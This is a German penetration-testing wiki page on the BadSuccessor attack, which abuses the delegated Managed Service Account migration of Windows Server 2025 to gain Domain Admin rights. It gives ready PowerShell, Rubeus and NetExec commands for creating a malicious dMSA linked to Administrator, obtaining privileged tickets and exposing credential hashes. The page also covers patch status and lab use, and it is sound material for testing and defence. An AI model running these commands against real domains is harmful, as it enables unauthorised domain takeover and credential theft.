# BadSuccessor

{{#include ../../../banners/hacktricks-training.md}}

## Übersicht

**BadSuccessor** missbraucht den Workflow zur Migration von **delegated Managed Service Accounts** (**dMSA**), der in **Windows Server 2025** eingeführt wurde. Ein dMSA kann über **`msDS-ManagedAccountPrecededByLink`** mit einem Legacy-Konto verknüpft und durch die in **`msDS-DelegatedMSAState`** gespeicherten Migrationszustände bewegt werden. Wenn ein Angreifer ein dMSA in einer beschreibbaren OU erstellen und diese Attribute kontrollieren kann, kann der KDC Tickets für das vom Angreifer kontrollierte dMSA mit dem **Autorisierungskontext des verknüpften Kontos** ausstellen.<sup>[[2]](#references)</sup>

In der Praxis bedeutet dies, dass ein Benutzer mit geringen Berechtigungen, der lediglich delegierte OU-Rechte besitzt, ein neues dMSA erstellen, es auf `Administrator` verweisen, den Migrationsstatus abschließen und anschließend ein TGT erhalten kann, dessen PAC privilegierte Gruppen wie **Domain Admins** enthält.<sup>[[2]](#references)</sup>

## Relevante Details zur dMSA-Migration

- dMSA ist eine Funktion von **Windows Server 2025**.
- `Start-ADServiceAccountMigration` setzt die Migration in den Zustand **started**.
- `Complete-ADServiceAccountMigration` setzt die Migration in den Zustand **completed**.
- `msDS-DelegatedMSAState = 1` bedeutet, dass die Migration gestartet wurde.
- `msDS-DelegatedMSAState = 2` bedeutet, dass die Migration abgeschlossen wurde.
- Während einer legitimen Migration soll das dMSA das abgelöste Konto transparent ersetzen, sodass KDC/LSA den Zugriff beibehalten, über den das vorherige Konto bereits verfügte.<sup>[[3]](#references)</sup>

Microsoft Learn weist außerdem darauf hin, dass während der Migration das ursprüngliche Konto mit dem dMSA verknüpft wird und das dMSA auf das zugreifen können soll, worauf das alte Konto zugreifen konnte.<sup>[[3]](#references)</sup> Dies ist die Sicherheitsannahme, die BadSuccessor missbraucht.<sup>[[2]](#references)</sup>

## Anforderungen

1. Eine Domain, in der **dMSA vorhanden ist**, was bedeutet, dass **Windows Server 2025**-Support auf der AD-Seite vorhanden ist.
2. Der Angreifer kann `msDS-DelegatedManagedServiceAccount`-Objekte in einer OU **erstellen** oder verfügt dort über gleichwertige, weitreichende Berechtigungen zum Erstellen untergeordneter Objekte.
3. Der Angreifer kann die relevanten dMSA-Attribute **schreiben** oder das soeben erstellte dMSA vollständig kontrollieren.
4. Der Angreifer kann Kerberos-Tickets aus einem Domain-joined-Kontext oder über einen Tunnel anfordern, der LDAP/Kerberos erreicht.<sup>[[2]](#references)</sup>

### Praktische Prüfungen

Das eindeutigste Signal für den Operator ist, die Domain-/Forest-Ebene zu überprüfen und zu bestätigen, dass die Umgebung bereits den neuen Server-2025-Stack verwendet:
```powershell
Get-ADDomain | Select Name,DomainMode
Get-ADForest | Select Name,ForestMode
```
Wenn du Werte wie `Windows2025Domain` und `Windows2025Forest` siehst, behandle **BadSuccessor / dMSA migration abuse** als Prioritätsprüfung.

Du kannst mit öffentlichen Tools außerdem beschreibbare OUs enumerieren, die für die dMSA-Erstellung delegiert wurden:<sup>[[1]](#references)</sup>
```powershell
.\Get-BadSuccessorOUPermissions.ps1
```

```bash
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor
```
## Missbrauchsablauf

1. Erstellen Sie eine dMSA in einer OU, in der Sie delegierte Create-Child-Rechte besitzen.
2. Setzen Sie **`msDS-ManagedAccountPrecededByLink`** auf den DN eines privilegierten Ziels wie `CN=Administrator,CN=Users,DC=corp,DC=local`.
3. Setzen Sie **`msDS-DelegatedMSAState`** auf `2`, um die Migration als abgeschlossen zu markieren.
4. Fordern Sie ein TGT für die neue dMSA an und verwenden Sie das zurückgegebene Ticket, um auf privilegierte Dienste zuzugreifen.<sup>[[2]](#references)</sup>

PowerShell-Beispiel:<sup>[[2]](#references)</sup>
```powershell
New-ADServiceAccount -Name attacker_dMSA -DNSHostName host.corp.local -Path "OU=Delegated,DC=corp,DC=local"
Set-ADServiceAccount attacker_dMSA -Add @{
msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=corp,DC=local"
}
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
Beispiele für Ticket-Anfragen / operative Tools:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/corp.local /dmsa /opsec /nowrap /ptt /ticket:<machine_tgt>
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor -o TARGET_OU='OU=Delegated,DC=corp,DC=local' DMSA_NAME=attacker TARGET_ACCOUNT=Administrator
```
## Warum dies mehr als nur privilege escalation ist

Bei einer legitimen Migration muss Windows außerdem sicherstellen, dass die neue dMSA Tickets verarbeiten kann, die vor dem Cutover für das vorherige Konto ausgestellt wurden. Deshalb kann das mit dMSA verbundene Ticket-Material im **`KERB-DMSA-KEY-PACKAGE`**-Ablauf **aktuelle** und **vorherige** Schlüssel enthalten.<sup>[[2]](#references)</sup>

Bei einer von einem Angreifer kontrollierten gefälschten Migration kann dieses Verhalten BadSuccessor in Folgendes verwandeln:<sup>[[2]](#references)</sup>

- **Privilege escalation** durch das Erben privilegierter Gruppen-SIDs im PAC.
- **Offenlegung von Credential-Material**, da die Verarbeitung vorheriger Schlüssel in anfälligen Workflows Material offenlegen kann, das dem RC4-/NT-Hash des Vorgängerkontos entspricht.

Dadurch ist die Technik sowohl für die direkte Übernahme der Domäne als auch für Folgeaktionen wie pass-the-hash oder eine umfassendere Kompromittierung von Zugangsdaten nützlich.

## Hinweise zum Patch-Status

Das ursprüngliche BadSuccessor-Verhalten ist **nicht nur ein theoretisches Problem einer Vorschauversion aus dem Jahr 2025**. Microsoft hat dafür **CVE-2025-53779** vergeben und im **August 2025** ein Sicherheitsupdate veröffentlicht.<sup>[[4]](#references)</sup> Dokumentiere diesen Angriff weiterhin für:

- **Labs / CTFs / Assume-Breach-Übungen**
- **ungepatchte Windows-Server-2025-Umgebungen**
- **die Überprüfung von OU-Delegationen und der dMSA-Exposition während Assessments**

Gehe nicht davon aus, dass eine Windows-Server-2025-Domäne allein deshalb anfällig ist, weil dMSA vorhanden ist. Überprüfe den Patch-Stand und teste sorgfältig.

## Werkzeuge

- [Akamai-BadSuccessor-Tools](https://github.com/akamai/BadSuccessor)
- [SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
- [NetExec-`badsuccessor`-Modul](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

## Quellen

- [1] [HTB: Eighteen – BadSuccessor-dMSA-Missbrauch bis zum Domain Admin (0xdf)](https://0xdf.gitlab.io/2026/04/11/htb-eighteen.html)
- [2] [Akamai – BadSuccessor: Missbrauch von dMSA zur Privilege Escalation in Active Directory](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [3] [Microsoft Learn – Übersicht über Delegated Managed Service Accounts](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview)
- [4] [Microsoft Security Response Center – CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)

{{#include ../../../banners/hacktricks-training.md}}
